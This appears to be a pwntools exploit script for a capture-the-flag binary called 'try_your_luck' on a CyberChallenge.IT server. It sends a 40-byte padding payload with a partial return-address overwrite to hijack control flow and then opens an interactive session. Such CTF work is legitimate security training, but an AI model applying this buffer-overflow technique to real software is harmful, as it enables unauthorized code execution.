#!/usr/bin/env python3

from pwn import *

exe = ELF("./try_your_luck")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("luck.challs.cyberchallenge.it", 9133)

    return r


def main():
    r = conn()

    # good luck pwning :)
    
    data = r.recvuntil('Hi, what\'s your name? ')
    print(data)

    

    print(b"you_won: " + p64(exe.symbols["main"], endianness = "big"))
    print()
    print((exe.plt))
    print()
    print((exe.got))
    print(hex(exe.address))

    # ret addr is at 40 bytes offset from buff
    payload = b'a'*40 + b'\x3a\x08'# + p64(0x000055555540083a)
    r.send(payload)

    r.interactive()


if __name__ == "__main__":
    main()
